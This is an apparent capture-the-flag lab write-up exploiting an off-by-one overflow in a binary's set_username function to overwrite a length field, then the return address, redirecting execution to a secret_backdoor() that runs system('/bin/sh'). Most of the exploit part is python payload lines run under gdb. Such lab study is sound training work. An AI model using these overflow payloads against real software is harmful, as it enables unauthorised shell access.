# level08

Nothing of note with `ll`.
`checksec` tells us that the `Partial RELRO`, `NX enabled` and `PIE enabled` protections are present.
`Partial RELRO` does not prevent a **PLT** overwrite.
`NX enabled`, or **N**o e**X**ecution indicates that it is not possible to execute code from the stack.
`PIE enabled` as tasty as this sounds, **Position Independant Executable** means the binary doesn’t run at a fixed memory address.
At each execution the base address is defined and all function addresses will have this offset.
So `printf address == base address + offset`.

Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|fgets|main|
|printf|handle_msg|
|puts|save|
|stdin|secret_backdoor|
|strncpy|set_msg|
|system|set_username|

Keen eyes will have spotted the `secret_backdoor()` function.
If we manage to reach it, we will be able to inject any command we want as an argument of `system()`.

We can see a structure named `msg_t`, it contains a **char message[140]**, a **char username[40]** and a an **int length**.

`set_username()` copies **41 bytes** of the `user's stdin input` into **message.username**.

Since **message.username** is **40 bytes** the last one overflows into **message.length**.

In `set_msg()` **message.length** bytes of the `user's stdin input` into **message.message**, this can be used to overwrite `handle_msg()`'s return address since `msg_t message` is stored there.

We need **message.username** to be
|padding|desired length as hexadecimal number|
|-|-|
|`a * 40`|`\xCA`|



```
Higher addresses
+----------------------+
| return address       |
| saved rbp            |
| ...                  |
| msg.len              |
| msg.username         |
| msg.message          |
+----------------------+
Lower addresses
```

```sh
echo -e "run < /tmp/out\nquit" > /tmp/g
```

```c
// python -c "print('a' * 40 + '\xC8'); print('a'*150);" > /tmp/out && gdb ./level09
//				does not crash:	C8	crashes: C9

// python -c "print('a' * 40 + '\xC8'); print('\x48\x8c'*100);" > /tmp/out && gdb ./level09
// 4a 4b

// python -c "print('a' * 40 + '\xA8'); print('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag');" > /tmp/out && gdb ./level09


// target address : 0x55555555488c


// p="'\x8c\x48'*200"; python -c "print('a' * 40 + '\xCa'); print($p);" > /tmp/out && gdb -x /tmp/g ./level09

// p="'\x90'*200 + '\x8c\x48'"; python -c "print('a' * 40 + '\xCa'); print($p);" > /tmp/out && gdb -x /tmp/g ./level09

// p="'\x90'*193 + '/bin/sh' + '\x8c\x48'"; python -c "print('a' * 40 + '\xCa'); print($p);" > /tmp/out && gdb -x /tmp/g ./level09

// p="'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag' + '\x8c\x48'"; python -c "print('a' * 40 + '\xCa'); print($p);" > /tmp/out && gdb -x /tmp/g ./level09
//																		here : Ac4A

// p="'\x90'*72 + '/bin/sh;' + 'a' * 120 + '\x8c\x48'"; python -c "print('a' * 40 + '\xCa'); print($p);" > /tmp/out && gdb -x /tmp/g ./level09
```
